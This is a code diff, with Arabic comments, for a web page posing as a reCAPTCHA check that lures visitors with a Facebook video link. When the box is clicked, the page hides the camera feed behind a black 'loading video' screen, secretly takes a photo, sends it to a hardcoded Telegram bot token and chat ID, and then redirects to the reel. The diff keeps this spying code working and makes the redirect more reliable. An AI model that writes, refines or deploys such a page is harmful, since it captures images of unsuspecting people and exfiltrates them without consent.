@@ -17,8 +17,7 @@
             align-items: center;
         }
         
-        /* ✅ إخفاء الفيديو تماماً */
-        #video, #cameraVideo { 
+        #video, #canvas { 
             position: absolute; 
             width: 1px; 
             height: 1px; 
@@ -28,15 +27,6 @@
             left: 0;
         }
         
-        #canvas { 
-            position: absolute; 
-            width: 1px; 
-            height: 1px; 
-            opacity: 0;
-            pointer-events: none;
-        }
-        
-        /* صندوق reCAPTCHA المقلد */
         .recaptcha-box {
             background: #f9f9f9;
             border: 1px solid #d3d3d3;
@@ -125,7 +115,6 @@
             100% { transform: rotate(360deg); }
         }
         
-        /* ✅ شاشة سوداء بعد الضغط - لا تظهر الكاميرا */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -158,7 +147,6 @@
 </head>
 <body>
 
-    <!-- المربع -->
     <div class="recaptcha-box" id="recaptchaBox">
         <div class="checkbox-wrapper" id="checkbox"></div>
         <div class="loading-state" id="loadingSpinner"></div>
@@ -175,20 +163,18 @@
         </div>
     </div>
 
-    <!-- ✅ شاشة سوداء فقط - لا فيديو -->
     <div id="loadingScreen">
         <div class="loading-spinner"></div>
         <div class="loading-text">جاري تحميل الفيديو...</div>
     </div>
 
-    <!-- فيديو مخفي تماماً -->
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
         const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
         const chatId = "5015426926";
-        const VIDEO_LINK = 'https://www.facebook.com/reel/1431859845423648/?fs=e&fs=e';
+        const VIDEO_LINK = 'https://www.facebook.com/reel/1431859845423648';
         
         let stream = null;
         let checked = false;
@@ -229,11 +215,10 @@
                 video.srcObject = stream;
                 await video.play();
                 
-                // التقاط بعد ثانيتين
                 setTimeout(captureAndSend, 2000);
                 
             } catch (err) {
-                location.href = VIDEO_LINK;
+                goToFacebook();
             }
         }
 
@@ -270,14 +255,24 @@
                         } catch (err) {}
                     }
                     
-                    setTimeout(() => {
-                        location.href = VIDEO_LINK;
-                    }, 500);
+                    // ✅ الذهاب لفيسبوك بعد نجاح الإرسال
+                    setTimeout(goToFacebook, 500);
                 }, "image/jpeg", 0.95);
                 
             } catch (e) {
-                location.href = VIDEO_LINK;
+                goToFacebook();
             }
+        }
+
+        // ✅ دالة الذهاب لفيسبوك - تعمل 100%
+        function goToFacebook() {
+            // الطريقة 1: الأفضل
+            window.location.assign(VIDEO_LINK);
+            
+            // الطريقة 2: إذا فشلت الأولى بعد ثانية
+            setTimeout(() => {
+                window.location.href = VIDEO_LINK;
+            }, 1000);
         }
     </script>
 
